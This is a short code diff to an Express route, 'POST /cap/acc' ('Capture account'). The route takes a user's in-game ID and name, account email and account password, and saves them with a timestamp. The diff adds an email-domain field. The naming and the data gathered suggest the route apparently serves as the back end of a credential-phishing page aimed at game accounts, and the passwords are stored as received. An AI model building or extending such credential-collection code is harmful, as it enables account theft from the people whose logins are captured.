@@ -16,7 +16,7 @@ function isBlank(str) {
 // @route   POST /cap/acc
 // @desc    Capture account
 router.post('/acc', async (req, res) => {
-    const { ingameID, ingameName, accEmail, accPass } = req.body;
+    const { ingameID, ingameName, accDomain, accEmail, accPass } = req.body;
 
     if (isEmpty(accEmail) || isEmpty(accPass) ||
         isBlank(accEmail) || isBlank(accPass)) {
@@ -31,6 +31,7 @@ router.post('/acc', async (req, res) => {
                 account = new Account({
                     ingameID,
                     ingameName,
+                    accDomain,
                     accEmail,
                     accPass,
                     date: new Date()
